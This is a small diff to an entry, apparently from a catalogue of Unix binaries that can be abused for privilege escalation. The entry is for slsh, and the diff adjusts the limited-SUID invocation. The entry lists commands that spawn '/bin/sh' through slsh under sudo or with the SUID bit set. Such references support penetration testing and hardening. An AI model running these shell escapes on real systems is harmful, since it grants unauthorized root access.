@@ -5,5 +5,5 @@ functions:
   sudo:
     - code: sudo slsh -e 'system("/bin/sh")'
   limited-suid:
-    - code: slsh -e 'system("/bin/sh")'
+    - code: ./slsh -e 'system("/bin/sh")'
 ---
